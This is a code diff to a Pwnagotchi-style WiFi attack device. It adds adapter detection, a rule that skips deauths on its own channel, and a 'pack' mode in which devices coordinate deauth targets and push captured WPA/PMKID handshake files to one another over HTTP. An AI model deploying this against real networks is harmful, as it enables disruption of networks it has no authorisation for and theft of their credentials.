@@ -109,11 +109,28 @@ class WiFiScanner:
         self.parallel_lock = threading.Lock()  # Protects parallel_networks
         self.current_5ghz_channel = None  # Track current 5GHz scanner channel for UI
         
+        # Adapter hardware capabilities (populated by _detect_all_adapter_capabilities)
+        self.adapter_capabilities = {}
+        
+        # Home channel: the channel wlan0 uses for LAN connectivity.
+        # Deauths are skipped on this channel to avoid knocking ourselves offline.
+        self.home_channel = None
+        
         # Social mode: detect and greet nearby Pawcaps/Pwnagotchis
         self._social_mode = config['wifi'].get('social_mode', False)
         self.social_encounters = {}   # peer_id -> {name, face, signal, count, ...}
         self._social_thread = None
         self._start_time = time.time()
+        
+        # Find Friends mode: rapid channel hopping to discover nearby Pawcaps
+        self._find_friends_mode = False
+        self._find_friends_thread = None
+        
+        # Pack mode: coordinate with nearby Pawcaps to cover more channels
+        self._pack_mode = False
+        self._pack_peers = {}  # peer_name -> {channels, last_seen, lan_ip, scan_state, ...}
+        self._pack_comms_thread = None
+        self._deauth_claims = {}  # bssid -> timestamp
         
         # Load persistent knowledge from database
         self._load_knowledge()
@@ -199,6 +216,110 @@ class WiFiScanner:
 
         return sorted(usb_adapters)
 
+    def _query_adapter_capabilities(self, iface):
+        """Query adapter hardware capabilities (supported bands, chipset, driver).
+        Returns dict with 'bands' (list), 'chipset' (str), 'driver' (str)."""
+        caps = {'bands': [], 'chipset': 'unknown', 'driver': 'unknown'}
+
+        # Get phy name for this interface
+        phy = None
+        try:
+            phy_path = f"/sys/class/net/{iface}/phy80211/name"
+            with open(phy_path, 'r') as f:
+                phy = f.read().strip()
+        except:
+            pass
+
+        if phy:
+            try:
+                result = subprocess.run(['iw', 'phy', phy, 'info'],
+                                      capture_output=True, text=True, timeout=5)
+                has_24 = False
+                has_5 = False
+                for line in result.stdout.splitlines():
+                    line = line.strip()
+                    if re.match(r'\* 2\d{3}\.', line):
+                        has_24 = True
+                    elif re.match(r'\* 5\d{3}\.', line):
+                        has_5 = True
+                if has_24:
+                    caps['bands'].append('2.4GHz')
+                if has_5:
+                    caps['bands'].append('5GHz')
+            except:
+                pass
+
+        # Get chipset/product name from USB device
+        try:
+            device_path = os.path.realpath(f"/sys/class/net/{iface}/device")
+            # Try USB product name
+            product_path = os.path.join(os.path.dirname(device_path), 'product')
+            if os.path.exists(product_path):
+                with open(product_path, 'r') as f:
+                    caps['chipset'] = f.read().strip()
+        except:
+            pass
+
+        # Get driver name
+        try:
+            driver_link = os.path.realpath(f"/sys/class/net/{iface}/device/driver")
+            caps['driver'] = os.path.basename(driver_link)
+        except:
+            pass
+
+        return caps
+
+    def _detect_home_channel(self):
+        """Detect the channel wlan0 is using for LAN connectivity.
+        Deauths on this channel would knock our own connection offline."""
+        # Method 1: iw (available on Raspberry Pi OS)
+        try:
+            result = subprocess.run(
+                ['iw', 'dev', 'wlan0', 'info'],
+                capture_output=True, text=True, timeout=5)
+            if result.returncode == 0:
+                for line in result.stdout.splitlines():
+                    line = line.strip()
+                    if line.startswith('channel '):
+                        ch = int(line.split()[1])
+                        self.home_channel = ch
+                        self._log_activity('INFO', f"Home channel (wlan0): {ch} — deauths will be skipped on this channel")
+                        return
+        except FileNotFoundError:
+            pass
+        except Exception:
+            pass
+
+        # Method 2: nmcli (available on Debian/NetworkManager systems)
+        try:
+            result = subprocess.run(
+                ['nmcli', '-t', '-f', 'IN-USE,CHAN', 'dev', 'wifi', 'list', 'ifname', 'wlan0'],
+                capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                for line in result.stdout.splitlines():
+                    if line.startswith('*:'):
+                        ch = int(line.split(':')[1])
+                        self.home_channel = ch
+                        self._log_activity('INFO', f"Home channel (wlan0): {ch} — deauths will be skipped on this channel")
+                        return
+        except FileNotFoundError:
+            pass
+        except Exception:
+            pass
+
+        self._log_activity('WARN', "Home channel unknown — deauth protection disabled")
+
+    def _detect_all_adapter_capabilities(self):
+        """Detect capabilities for all USB adapters. Populates self.adapter_capabilities."""
+        self.adapter_capabilities = {}
+        usb_adapters = self._detect_adapters()
+        for iface in usb_adapters:
+            caps = self._query_adapter_capabilities(iface)
+            self.adapter_capabilities[iface] = caps
+            bands_str = ' + '.join(caps['bands']) if caps['bands'] else 'unknown'
+            self._log_activity('INFO',
+                f"  {iface}: {caps['chipset']} ({caps['driver']}) [{bands_str}]")
+
     def _detect_and_validate_adapters(self):
         """Detect USB adapters and assign scan/capture roles"""
         usb_adapters = self._detect_adapters()
@@ -209,6 +330,9 @@ class WiFiScanner:
             return False
 
         self._log_activity('INFO', f"Detected USB adapters: {usb_adapters}")
+
+        # Detect adapter hardware capabilities (bands, chipset, driver)
+        self._detect_all_adapter_capabilities()
 
         # Explicit capture_interface from config
         cap_cfg = self.capture_interface_config
@@ -267,6 +391,8 @@ class WiFiScanner:
             self._log_activity('ERROR', "Scanner startup aborted for safety!")
             self.running = False
             return
+        
+        self._detect_home_channel()
         
         self.running = True
         self._enable_monitor_mode_on(self.scan_interface)
@@ -509,28 +635,58 @@ class WiFiScanner:
         ]
         return {'state': 'hunting', 'face': 'υ´•ᴥ•`υ', 'message': random.choice(hunting)}
 
+    def _adapter_label(self, iface, role_suffix=''):
+        """Build a dynamic label for an adapter using detected capabilities.
+        
+        Args:
+            iface: Interface name (e.g. 'wlan1')
+            role_suffix: Optional suffix like ' / Deauth' or ' / Capture'
+        
+        Returns e.g. 'Dual-Band Scanner / Deauth' or '2.4GHz Scanner'
+        """
+        caps = getattr(self, 'adapter_capabilities', {}).get(iface, {})
+        bands = caps.get('bands', [])
+        if len(bands) >= 2:
+            band_label = 'Dual-Band'
+        elif bands:
+            band_label = bands[0]
+        else:
+            band_label = 'Unknown'
+        return f"{band_label} Scanner{role_suffix}"
+
+    def _adapter_hw_info(self, iface):
+        """Return chipset and driver info dict for an adapter."""
+        caps = getattr(self, 'adapter_capabilities', {}).get(iface, {})
+        return {
+            'chipset': caps.get('chipset', 'unknown'),
+            'driver': caps.get('driver', 'unknown'),
+            'bands': caps.get('bands', [])
+        }
+
     def get_interface_status(self):
         """Get WiFi interface status for web UI with rich capture data"""
         interfaces = []
 
         if not self.running:
-            iface_type = 'Scan + Capture' if not self.dual_mode else 'Scan Adapter'
+            iface_type = 'Scan + Capture' if not self.dual_mode else self._adapter_label(self.scan_interface)
             interfaces.append({
                 'name': self.scan_interface,
                 'mode': 'Managed',
                 'type': iface_type,
                 'status': 'inactive',
                 'channel': '--',
-                'target': None
+                'target': None,
+                'hw': self._adapter_hw_info(self.scan_interface)
             })
             if self.dual_mode:
                 interfaces.append({
                     'name': self.capture_interface,
                     'mode': 'Managed',
-                    'type': 'Capture Adapter',
+                    'type': self._adapter_label(self.capture_interface),
                     'status': 'inactive',
                     'channel': '--',
-                    'target': None
+                    'target': None,
+                    'hw': self._adapter_hw_info(self.capture_interface)
                 })
             return interfaces
 
@@ -549,15 +705,14 @@ class WiFiScanner:
 
         if self.dual_mode:
             # During capture: both adapters pause scanning and coordinate attack
-            # wlan1 (scan_interface): sends deauth packets
-            # wlan2 (capture_interface): captures handshake packets
+            # scan_interface: sends deauth packets
+            # capture_interface: captures handshake packets
             if active_capture:
                 elapsed = int(time.time() - active_capture['start_time'])
-                # wlan1: Deauth adapter during capture
                 interfaces.append({
                     'name': self.scan_interface,
                     'mode': 'Monitor',
-                    'type': '2.4GHz Scanner / Deauth',
+                    'type': self._adapter_label(self.scan_interface, ' / Deauth'),
                     'status': 'DEAUTHING' if active_capture['deauthing'] else 'ATTACKING',
                     'channel': active_capture['channel'],
                     'target': {
@@ -565,42 +720,45 @@ class WiFiScanner:
                         'bssid': active_capture['bssid'],
                         'elapsed': elapsed,
                         'deauthing': active_capture['deauthing']
-                    }
+                    },
+                    'hw': self._adapter_hw_info(self.scan_interface)
                 })
-                # wlan2: Capture adapter
                 interfaces.append({
                     'name': self.capture_interface,
                     'mode': 'Monitor',
-                    'type': '5GHz Scanner / Capture',
+                    'type': self._adapter_label(self.capture_interface, ' / Capture'),
                     'status': 'CAPTURING',
                     'channel': active_capture['channel'],
                     'target': {
                         'ssid': active_capture['ssid'],
                         'bssid': active_capture['bssid'],
                         'elapsed': elapsed,
-                        'deauthing': False  # This adapter captures, doesn't deauth
-                    }
+                        'deauthing': False
+                    },
+                    'hw': self._adapter_hw_info(self.capture_interface)
                 })
             else:
                 # Not capturing: both adapters scanning in parallel
                 interfaces.append({
                     'name': self.scan_interface,
                     'mode': 'Monitor',
-                    'type': '2.4GHz Scanner',
+                    'type': self._adapter_label(self.scan_interface),
                     'status': 'SCANNING',
                     'channel': self.stats.get('channel', '--'),
-                    'target': None
+                    'target': None,
+                    'hw': self._adapter_hw_info(self.scan_interface)
                 })
                 interfaces.append({
                     'name': self.capture_interface,
                     'mode': 'Monitor',
-                    'type': '5GHz Scanner',
+                    'type': self._adapter_label(self.capture_interface),
                     'status': 'SCANNING',
                     'channel': self.current_5ghz_channel if self.current_5ghz_channel else '--',
-                    'target': None
+                    'target': None,
+                    'hw': self._adapter_hw_info(self.capture_interface)
                 })
         else:
-            # Single-adapter mode — same as before
+            # Single-adapter mode
             if active_capture:
                 elapsed = int(time.time() - active_capture['start_time'])
                 interfaces.append({
@@ -614,7 +772,8 @@ class WiFiScanner:
                         'bssid': active_capture['bssid'],
                         'elapsed': elapsed,
                         'deauthing': active_capture['deauthing']
-                    }
+                    },
+                    'hw': self._adapter_hw_info(self.scan_interface)
                 })
             else:
                 interfaces.append({
@@ -623,7 +782,8 @@ class WiFiScanner:
                     'type': 'Scan + Capture',
                     'status': 'SCANNING',
                     'channel': self.stats.get('channel', '--'),
-                    'target': None
+                    'target': None,
+                    'hw': self._adapter_hw_info(self.scan_interface)
                 })
 
         return interfaces
@@ -766,6 +926,11 @@ class WiFiScanner:
         # Main targeting loop
         while self.running:
             try:
+                # Pause targeting while Find Friends mode is active
+                if self._find_friends_mode:
+                    time.sleep(1)
+                    continue
+                
                 # Organic break
                 if self.organic_mode:
                     self._organic_break()
@@ -816,6 +981,11 @@ class WiFiScanner:
         channels_24ghz = list(range(1, 12))
         
         while self.running:
+            # Pause scanning while Find Friends mode is active
+            if self._find_friends_mode:
+                time.sleep(1)
+                continue
+            
             # Check if capture is active - if so, pause scanning and kill any running scans
             with self.capture_lock:
                 if len(self.capturing) > 0:
@@ -828,7 +998,10 @@ class WiFiScanner:
                     time.sleep(2)
                     continue
             
-            for channel in channels_24ghz:
+            # Pack mode: reorder channels to prioritize uncovered ones
+            scan_channels = self._pack_reorder_channels(channels_24ghz)
+            
+            for channel in scan_channels:
                 if not self.running:
                     return
                 
@@ -880,12 +1053,20 @@ class WiFiScanner:
         channels_5ghz = channels_5ghz_safe + channels_5ghz_dfs
         
         while self.running:
+            # Pause scanning while Find Friends mode is active
+            if self._find_friends_mode:
+                time.sleep(1)
+                continue
+            
             # Check if capture is active - if so, pause scanning
             if self._capture_active():
                 time.sleep(1)
                 continue
             
-            for channel in channels_5ghz:
+            # Pack mode: reorder channels to prioritize uncovered ones
+            scan_channels = self._pack_reorder_channels(channels_5ghz)
+            
+            for channel in scan_channels:
                 if not self.running:
                     return
                 
@@ -925,6 +1106,8 @@ class WiFiScanner:
         Uses Popen + poll loop so it can be interrupted immediately when a capture
         starts on this interface (the 5GHz scan must yield to captures).
         """
+        if self._find_friends_mode:
+            return []
         networks = []
         scan_prefix = f'/tmp/pawcap_scan_{interface}'
         
@@ -952,11 +1135,11 @@ class WiFiScanner:
             
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
-            # Poll every 0.5s so we can bail fast if a capture starts
+            # Poll every 0.5s so we can bail fast if a capture or find-friends starts
             deadline = time.time() + dwell
             while time.time() < deadline and self.running:
-                if self._capture_active():
-                    # Capture started — kill scan immediately and bail
+                if self._capture_active() or self._find_friends_mode:
+                    # Capture or find-friends started — kill scan immediately and bail
                     try:
                         proc.terminate()
                         proc.wait(timeout=2)
@@ -1033,6 +1216,11 @@ class WiFiScanner:
         
         while self.running:
             try:
+                # Pause scanning while Find Friends mode is active
+                if self._find_friends_mode:
+                    time.sleep(1)
+                    continue
+                
                 # Periodic memory cleanup
                 self._cleanup_memory()
                 
@@ -1057,7 +1245,7 @@ class WiFiScanner:
                     self.candidates.clear()
                 self.stats['scan_phase'] = PHASE_24GHZ
                 
-                self._sweep_channels(channels_24ghz)
+                self._sweep_channels(self._pack_reorder_channels(channels_24ghz))
                 
                 if not self.running:
                     break
@@ -1090,7 +1278,7 @@ class WiFiScanner:
                     
                     # --- Phase 2: 5GHz safe channels ---
                     self.stats['scan_phase'] = PHASE_5GHZ_SAFE
-                    self._sweep_channels(channels_5ghz_safe)
+                    self._sweep_channels(self._pack_reorder_channels(channels_5ghz_safe))
                     
                     if not self.running:
                         break
@@ -1114,7 +1302,7 @@ class WiFiScanner:
                     # --- Phase 3: 5GHz DFS channels (last resort) ---
                     self.stats['scan_phase'] = PHASE_5GHZ_DFS
                     self._log_activity('INFO', "No good targets yet - scanning DFS channels")
-                    self._sweep_channels(channels_5ghz_dfs)
+                    self._sweep_channels(self._pack_reorder_channels(channels_5ghz_dfs))
                     
                     if not self.running:
                         break
@@ -1237,8 +1425,20 @@ class WiFiScanner:
             self._log_activity('INFO',
                 "Retrace complete — no new 5GHz BSSIDs found for blacklisted SSIDs")
 
+    def _get_lan_ip(self):
+        """Get our LAN IP address for pack HTTP communication."""
+        try:
+            result = subprocess.run(['hostname', '-I'], capture_output=True, text=True, timeout=2)
+            lan_prefix = self.config['device']['lan_network'].split('/')[0].rsplit('.', 1)[0]
+            for ip in result.stdout.strip().split():
+                if ip.startswith(lan_prefix):
+                    return ip
+        except:
+            pass
+        return None
+
     # --- Social beacon constants ---
-    PAWCAP_BEACON_BSSID = 'fa:rf:e1:d0:90:00'
+    PAWCAP_BEACON_BSSID = 'fa:ce:1d:09:00:00'
     PWNAGOTCHI_BEACON_BSSID = 'de:ad:be:ef:de:ad'
     PAWCAP_IE_ID = 222
     SOCIAL_BEACON_INTERVAL = 30
@@ -1524,6 +1724,318 @@ class WiFiScanner:
         elif not enabled:
             self._log_activity('INFO', 'Social mode disabled')
 
+    # --- Find Friends mode: rapid channel hopping to discover peers ---
+    @property
+    def find_friends_mode(self):
+        return self._find_friends_mode
+
+    @find_friends_mode.setter
+    def find_friends_mode(self, enabled):
+        self._find_friends_mode = enabled
+        if enabled and self._find_friends_thread is None and SCAPY_AVAILABLE:
+            # Auto-enable social mode (needed for beacons)
+            if not self._social_mode:
+                self.social_mode = True
+            # Kill all scanning, capture, and deauth processes
+            for proc_name in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver']:
+                try:
+                    subprocess.run(['sudo', 'pkill', '-f', proc_name], capture_output=True, timeout=3)
+                except:
+                    pass
+            # Clear active captures so scan loops don't stay blocked
+            with self.capture_lock:
+                self.capturing.clear()
+            self._find_friends_thread = threading.Thread(target=self._find_friends_worker, daemon=True)
+            self._find_friends_thread.start()
+            self._log_activity('INFO', 'Find Friends mode enabled — scanning stopped, searching for pack!')
+        elif not enabled:
+            self._log_activity('INFO', 'Find Friends mode disabled — resuming scanning')
+
+    FIND_FRIENDS_CHANNELS = [1, 6, 11, 36, 149]
+
+    def _find_friends_worker(self):
+        """Rapid channel hopping to find nearby Pawcaps.
+        Hops through key channels broadcasting and sniffing with short dwell times."""
+        self._log_activity('INFO', 'Find Friends worker started')
+        while self._find_friends_mode and self.running:
+            try:
+                for channel in self.FIND_FRIENDS_CHANNELS:
+                    if not self._find_friends_mode or not self.running:
+                        break
+                    # Set channel on scan interface
+                    try:
+                        subprocess.run(
+                            ['sudo', 'iw', 'dev', self.scan_interface, 'set', 'channel', str(channel)],
+                            capture_output=True, timeout=2
+                        )
+                    except:
+                        pass
+                    self.stats['channel'] = channel
+                    self.stats['scan_phase'] = 'find_friends'
+                    self._log_activity('DEBUG', f'Find Friends: searching on channel {channel}...')
+                    # Broadcast our beacon
+                    self._social_broadcast()
+                    # Sniff for 3 seconds (longer dwell = better chance of overlap)
+                    self._social_sniff(timeout=3)
+                    # Broadcast again at end of dwell window
+                    self._social_broadcast()
+            except Exception as e:
+                self._log_activity('WARN', f'Find Friends worker error: {e}')
+                time.sleep(2)
+        self._find_friends_thread = None
+        self._log_activity('INFO', 'Find Friends worker stopped')
+
+    # --- Pack mode: coordinate channel scanning with nearby Pawcaps ---
+    @property
+    def pack_mode(self):
+        return self._pack_mode
+
+    @pack_mode.setter
+    def pack_mode(self, enabled):
+        self._pack_mode = enabled
+        if enabled:
+            # Auto-enable social mode (needed for beacon communication)
+            if not self._social_mode:
+                self.social_mode = True
+            # Start pack comms worker for HTTP-based coordination
+            if self._pack_comms_thread is None:
+                self._pack_comms_thread = threading.Thread(target=self._pack_comms_worker, daemon=True)
+                self._pack_comms_thread.start()
+            self._log_activity('INFO', 'Pack mode enabled — coordinating with nearby Pawcaps!')
+        else:
+            self._pack_peers.clear()
+            self._deauth_claims.clear()
+            self._log_activity('INFO', 'Pack mode disabled')
+
+    def _pack_reorder_channels(self, channels):
+        """Reorder channel list to prioritize channels not covered by pack peers.
+        Uses HTTP-synced scan_state (more reliable) with beacon fallback."""
+        if not self._pack_mode or not self._pack_peers:
+            return channels
+
+        # Prune stale peers (>120s with no beacon AND no HTTP)
+        now = time.time()
+        stale = [name for name, info in self._pack_peers.items()
+                 if now - info.get('last_seen', 0) > 120 and not info.get('http_reachable')]
+        for name in stale:
+            del self._pack_peers[name]
+
+        if not self._pack_peers:
+            return channels
+
+        # Collect channels covered by peers — prefer HTTP-synced state
+        covered = set()
+        for info in self._pack_peers.values():
+            scan_state = info.get('scan_state', {})
+            if scan_state.get('channel'):
+                covered.add(scan_state['channel'])
+            else:
+                covered.update(info.get('channels', []))
+
+        # Sort: uncovered first, covered last
+        uncovered = [ch for ch in channels if ch not in covered]
+        covered_list = [ch for ch in channels if ch in covered]
+        return uncovered + covered_list
+
+    def _get_pack_scan_state(self):
+        """Get our current scan state for pack sync."""
+        capturing_bssid = None
+        with self.capture_lock:
+            if self.capturing:
+                capturing_bssid = list(self.capturing.keys())[0]
+        return {
+            'phase': self.stats.get('scan_phase', ''),
+            'channel': self.stats.get('channel', 0),
+            'capturing': capturing_bssid,
+            'candidates': len(self.candidates)
+        }
+
+    def _get_deauth_claims(self):
+        """Get active deauth claims (prune expired >60s)."""
+        now = time.time()
+        self._deauth_claims = {b: t for b, t in self._deauth_claims.items() if now - t < 60}
+        return dict(self._deauth_claims)
+
+    def _get_handshake_bssids(self):
+        """Get list of BSSIDs we have handshakes for."""
+        if self.db and hasattr(self.db, 'get_all_handshakes'):
+            try:
+                return [h['bssid'] for h in self.db.get_all_handshakes()]
+            except:
+                pass
+        return []
+
+    def _pack_comms_worker(self):
+        """Background thread: periodic HTTP sync with pack peers."""
+        import urllib.request
+        import urllib.error
+        self._log_activity('INFO', 'Pack comms worker started')
+        while self._pack_mode and self.running:
+            try:
+                peers = dict(self._pack_peers)
+                for peer_name, peer_info in peers.items():
+                    if not self._pack_mode or not self.running:
+                        break
+                    lan_ip = peer_info.get('lan_ip')
+                    if not lan_ip:
+                        continue
+                    web_port = peer_info.get('web_port', 8080)
+                    url = f'http://{lan_ip}:{web_port}/api/pack/sync'
+                    our_state = {
+                        'device_name': self.config['device'].get('name', 'Pawcap'),
+                        'scan_state': self._get_pack_scan_state(),
+                        'handshake_bssids': self._get_handshake_bssids(),
+                        'deauth_claims': self._get_deauth_claims()
+                    }
+                    try:
+                        payload = json.dumps(our_state).encode()
+                        req = urllib.request.Request(
+                            url, data=payload,
+                            headers={'Content-Type': 'application/json'},
+                            method='POST'
+                        )
+                        with urllib.request.urlopen(req, timeout=5) as resp:
+                            resp_data = json.loads(resp.read().decode())
+                        # Update peer with HTTP-synced data
+                        if peer_name in self._pack_peers:
+                            self._pack_peers[peer_name]['scan_state'] = resp_data.get('scan_state', {})
+                            self._pack_peers[peer_name]['handshake_bssids'] = resp_data.get('handshake_bssids', [])
+                            self._pack_peers[peer_name]['deauth_claims'] = resp_data.get('deauth_claims', {})
+                            self._pack_peers[peer_name]['http_reachable'] = True
+                        self._log_activity('DEBUG', f'Pack sync with {peer_name} OK')
+                    except Exception as e:
+                        if peer_name in self._pack_peers:
+                            self._pack_peers[peer_name]['http_reachable'] = False
+                        self._log_activity('DEBUG', f'Pack sync with {peer_name} failed: {e}')
+
+                # Push missing handshakes to reachable peers
+                for peer_name, peer_info in dict(self._pack_peers).items():
+                    if not self._pack_mode or not self.running:
+                        break
+                    if peer_info.get('http_reachable'):
+                        try:
+                            self._pack_push_missing_handshakes(peer_name, peer_info)
+                        except Exception as e:
+                            self._log_activity('DEBUG', f'Pack handshake push to {peer_name} failed: {e}')
+
+                # Prune peers with no beacon AND no HTTP for >120s
+                now = time.time()
+                stale = [name for name, info in self._pack_peers.items()
+                         if now - info.get('last_seen', 0) > 120 and not info.get('http_reachable')]
+                for name in stale:
+                    del self._pack_peers[name]
+                    self._log_activity('INFO', f'Pack peer {name} pruned (stale)')
+
+            except Exception as e:
+                self._log_activity('WARN', f'Pack comms worker error: {e}')
+
+            # Sleep 10s in 1s increments for responsiveness
+            for _ in range(10):
+                if not self._pack_mode or not self.running:
+                    break
+                time.sleep(1)
+
+        self._pack_comms_thread = None
+        self._log_activity('INFO', 'Pack comms worker stopped')
+
+    def _pack_push_missing_handshakes(self, peer_name, peer_info):
+        """Push handshake files the peer doesn't have (max 3 per cycle)."""
+        import urllib.request
+        peer_bssids = set(peer_info.get('handshake_bssids', []))
+        our_bssids = self._get_handshake_bssids()
+        missing = [b for b in our_bssids if b not in peer_bssids]
+        if not missing:
+            return
+
+        lan_ip = peer_info.get('lan_ip')
+        web_port = peer_info.get('web_port', 8080)
+        dest_dir = self.config['capture']['handshake_dir']
+
+        for bssid in missing[:3]:
+            # Find the capture file for this BSSID
+            if not self.db:
+                continue
+            handshakes = self.db.get_all_handshakes()
+            hs_entry = next((h for h in handshakes if h['bssid'] == bssid), None)
+            if not hs_entry:
+                continue
+
+            capture_file = hs_entry.get('capture_file', '')
+            # Try the handshake_dir for the actual file
+            if not os.path.isfile(capture_file):
+                # Check handshake_dir for files matching this BSSID
+                safe_bssid = bssid.replace(':', '')
+                matches = globmod.glob(os.path.join(dest_dir, f'*{safe_bssid}*'))
+                if matches:
+                    capture_file = matches[0]
+                else:
+                    continue
+
+            if not os.path.isfile(capture_file):
+                continue
+
+            try:
+                self._pack_send_handshake_file(
+                    lan_ip, web_port, bssid,
+                    hs_entry.get('ssid', 'Unknown'),
+                    hs_entry.get('channel'),
+                    capture_file
+                )
+                self._log_activity('INFO', f'Pack: pushed handshake {bssid} to {peer_name}')
+            except Exception as e:
+                self._log_activity('DEBUG', f'Pack: failed to push {bssid} to {peer_name}: {e}')
+
+    def _pack_send_handshake_file(self, lan_ip, web_port, bssid, ssid, channel, capture_file):
+        """Send a handshake capture file to a pack peer via multipart POST."""
+        import urllib.request
+        url = f'http://{lan_ip}:{web_port}/api/pack/handshake'
+        boundary = f'----PawcapPack{int(time.time()*1000)}'
+
+        metadata = json.dumps({'bssid': bssid, 'ssid': ssid, 'channel': channel})
+        with open(capture_file, 'rb') as f:
+            file_data = f.read()
+        filename = os.path.basename(capture_file)
+
+        body = (
+            f'--{boundary}\r\n'
+            f'Content-Disposition: form-data; name="metadata"\r\n'
+            f'Content-Type: application/json\r\n\r\n'
+            f'{metadata}\r\n'
+            f'--{boundary}\r\n'
+            f'Content-Disposition: form-data; name="capture"; filename="{filename}"\r\n'
+            f'Content-Type: application/octet-stream\r\n\r\n'
+        ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
+
+        req = urllib.request.Request(
+            url, data=body,
+            headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
+            method='POST'
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return json.loads(resp.read().decode())
+
+    def _pack_notify_handshake(self, bssid, ssid, capture_file, channel):
+        """Fire-and-forget: immediately push a new handshake to all reachable pack peers."""
+        if not self._pack_mode:
+            return
+        peers = [(name, info) for name, info in self._pack_peers.items()
+                 if info.get('http_reachable') and info.get('lan_ip')]
+        if not peers:
+            return
+
+        def _push():
+            for peer_name, peer_info in peers:
+                try:
+                    self._pack_send_handshake_file(
+                        peer_info['lan_ip'], peer_info.get('web_port', 8080),
+                        bssid, ssid, channel, capture_file
+                    )
+                    self._log_activity('INFO', f'Pack: notified {peer_name} of new handshake {bssid}')
+                except Exception as e:
+                    self._log_activity('DEBUG', f'Pack: notify {peer_name} failed: {e}')
+
+        threading.Thread(target=_push, daemon=True).start()
+
     def _load_social_encounters(self):
         """Load persisted social encounters from DB into memory"""
         if not self.db or not hasattr(self.db, 'get_social_encounters'):
@@ -1546,8 +2058,8 @@ class WiFiScanner:
                     'count': row['encounter_count'],
                     'first_seen': row['first_seen'],
                     'last_seen': row['last_seen'],
-                    'version': payload.get('version', '?'),
-                    'pwnd_tot': payload.get('pwnd_tot', 0),
+                    'version': payload.get('ver', payload.get('version', '?')),
+                    'pwnd_tot': payload.get('pwnd', payload.get('pwnd_tot', 0)),
                 }
             if rows:
                 self._log_activity('INFO', f"Loaded {len(rows)} friend(s) from database")
@@ -1576,15 +2088,24 @@ class WiFiScanner:
         if not SCAPY_AVAILABLE:
             return
         try:
-            payload = json.dumps({
+            payload_dict = {
                 'name': self.config['device'].get('name', 'Pawcap'),
                 'type': 'pawcap',
-                'version': '1.0',
-                'pwnd_tot': self.stats.get('handshakes', 0),
-                'uptime': int(time.time() - self._start_time),
+                'ver': '1.0',
+                'pwnd': self.stats.get('handshakes', 0),
+                'up': int(time.time() - self._start_time),
                 'face': self.get_mood().get('face', 'U・ᴥ・U'),
-                'networks': len(self.seen_networks)
-            })
+                'nets': len(self.seen_networks)
+            }
+            # Pack mode: include channel coordination data + LAN address
+            if self._pack_mode:
+                payload_dict['pack'] = {
+                    'ch': [self.stats.get('channel', 0)],
+                    'ip': self._get_lan_ip(),
+                    'port': self.config['device'].get('web_port', 8080)
+                }
+            # Dot11Elt len field is 1 byte (max 255) — use compact JSON
+            payload = json.dumps(payload_dict, separators=(',', ':'))
             frame = (
                 RadioTap() /
                 Dot11(type=0, subtype=8,
@@ -1679,8 +2200,8 @@ class WiFiScanner:
             enc['last_seen'] = now
             enc['signal'] = signal
             enc['face'] = payload.get('face', enc.get('face', ''))
-            enc['version'] = payload.get('version', enc.get('version', '?'))
-            enc['pwnd_tot'] = payload.get('pwnd_tot', enc.get('pwnd_tot', 0))
+            enc['version'] = payload.get('ver', payload.get('version', enc.get('version', '?')))
+            enc['pwnd_tot'] = payload.get('pwnd', payload.get('pwnd_tot', enc.get('pwnd_tot', 0)))
         else:
             self.social_encounters[peer_id] = {
                 'name': peer_name,
@@ -1690,8 +2211,8 @@ class WiFiScanner:
                 'count': 1,
                 'first_seen': now,
                 'last_seen': now,
-                'version': payload.get('version', '?'),
-                'pwnd_tot': payload.get('pwnd_tot', 0),
+                'version': payload.get('ver', payload.get('version', '?')),
+                'pwnd_tot': payload.get('pwnd', payload.get('pwnd_tot', 0)),
             }
             friend_type = 'friend' if peer_type == 'pawcap' else 'pwnagotchi'
             self._log_activity('SUCCESS', f'{self.device_name} met a {friend_type}: {peer_name}!')
@@ -1699,6 +2220,23 @@ class WiFiScanner:
         # Persist to DB
         if self.db and hasattr(self.db, 'record_social_encounter'):
             self.db.record_social_encounter(peer_id, peer_name, peer_type, payload_json, signal)
+
+        # Pack mode: track peer channel data + LAN address for HTTP tunnel
+        pack_data = payload.get('pack')
+        if pack_data and self._pack_mode:
+            existing = self._pack_peers.get(peer_name, {})
+            self._pack_peers[peer_name] = {
+                'channels': pack_data.get('ch', pack_data.get('scanning', [])),
+                'last_seen': time.time(),
+                'device_id': pack_data.get('device_id', peer_name),
+                'lan_ip': pack_data.get('ip', pack_data.get('lan_ip')),
+                'web_port': pack_data.get('port', pack_data.get('web_port', 8080)),
+                # Preserve HTTP-synced fields (populated by _pack_comms_worker)
+                'scan_state': existing.get('scan_state', {}),
+                'handshake_bssids': existing.get('handshake_bssids', []),
+                'deauth_claims': existing.get('deauth_claims', {}),
+                'http_reachable': existing.get('http_reachable', False),
+            }
 
     def _organic_socialize(self):
         """Organic action: quick social broadcast + sniff.
@@ -1725,6 +2263,10 @@ class WiFiScanner:
         """Sweep a list of channels, scanning each one."""
         for channel in channels:
             if not self.running:
+                return
+            
+            # Abort sweep if Find Friends is active
+            if self._find_friends_mode:
                 return
             
             # Abort sweep if a capture started (single-adapter only)
@@ -1783,6 +2325,8 @@ class WiFiScanner:
     
     def _quick_scan_channel(self, channel):
         """Quick scan of current channel using airodump-ng"""
+        if self._find_friends_mode:
+            return []
         networks = []
         scan_prefix = f'/tmp/pawcap_scan'
         
@@ -2094,6 +2638,7 @@ class WiFiScanner:
         self.stats['passive_captures'] = self.stats.get('passive_captures', 0) + 1
         self.capture_successes += 1
         self.last_passive_capture_time = time.time()
+        self._pack_notify_handshake(bssid, ssid, dest_file, channel)
         
         # Update persistent knowledge
         if self.db and hasattr(self.db, 'record_success'):
@@ -2515,6 +3060,7 @@ class WiFiScanner:
                 self.capture_successes += 1
                 self.last_handshake_time = time.time()
                 self._log_activity('SUCCESS', f"PMKID handshake saved: {ssid}")
+                self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                 if self.db and hasattr(self.db, 'record_success'):
                     self.db.record_success(bssid)
                 if bssid in self.network_knowledge:
@@ -2565,6 +3111,16 @@ class WiFiScanner:
             elif reason == 'timeout' and consec >= 2:
                 strategy = 'extended'  # Give it more time
                 self._log_activity('INFO', f"Strategy: extended capture (timed out {consec}x)")
+
+        # Pack coordination: if a peer is already deauthing this BSSID, go passive
